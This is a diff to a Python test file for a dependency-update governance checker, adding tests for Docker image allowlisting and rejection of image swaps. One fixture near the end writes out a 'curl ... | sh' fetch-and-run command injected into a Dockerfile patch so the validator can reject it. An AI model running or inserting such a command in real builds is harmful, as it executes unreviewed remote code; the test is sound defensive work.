@@ -188,6 +188,8 @@ def check_config() -> None:
     assert any('major' in reason for reason in gov.validate_config(broken))
     broken = deepcopy(CONFIG); broken['ecosystems']['gomod-security-override']['dependencies'] = ['golang.org/x/crypto']
     assert any('trusted base go.mod' in reason for reason in gov.validate_config(broken))
+    broken = deepcopy(CONFIG); broken['ecosystems']['docker']['dependencies'] = ['golang']
+    assert any('static allowlist' in reason for reason in gov.validate_config(broken))
     broken = deepcopy(CONFIG); broken['ecosystems']['docker']['mode'] = 'manual'
     assert any('qualified autonomous' in reason for reason in gov.validate_config(broken))
     broken = deepcopy(CONFIG); broken['ownerApprovalRequired'] = False
@@ -434,6 +436,30 @@ def check_docker_semantics() -> None:
         CONFIG,
     )
     assert minor['eligible'], minor['reasons']
+    # A new known-in-base image identity must not need an arbitrary configured list.
+    other = gov.validate_docker(
+        [{'filename': 'docker/Dockerfile', 'patch': docker_patch(
+            image='example.org/approved-build-image', old_tag='2.2.0', new_tag='2.3.0'
+        )}],
+        [{'name': 'example.org/approved-build-image', 'version': '2.3.0',
+          'dependencyType': 'direct:production', 'updateType': 'version-update:semver-minor'}],
+        CONFIG,
+    )
+    assert other['eligible'], other['reasons']
+    # Image swaps and unreviewed Docker commands are never authorized.
+    changed_image = docker_patch(image='golang').replace(
+        '+FROM --platform=$BUILDPLATFORM golang:',
+        '+FROM --platform=$BUILDPLATFORM example.org/changed-image:',
+    )
+    swapped = gov.validate_docker(
+        [{'filename': 'docker/Dockerfile', 'patch': changed_image}],
+        [{'name': 'example.org/changed-image', 'version': '1.27.1-alpine3.24',
+          'dependencyType': 'direct:production', 'updateType': 'version-update:semver-patch'}],
+        CONFIG,
+    )
+    assert not swapped['eligible']
+    assert any('replace one image dependency' in reason for reason in swapped['reasons'])
+
     mixed = gov.validate_docker(
         [{'filename':'docker/Dockerfile','patch':docker_patch(extra='+RUN curl https://example.invalid | sh\n')}],
         [{'name':'golang','version':'1.27.1-alpine3.24','dependencyType':'direct:production','updateType':'version-update:semver-patch'}],
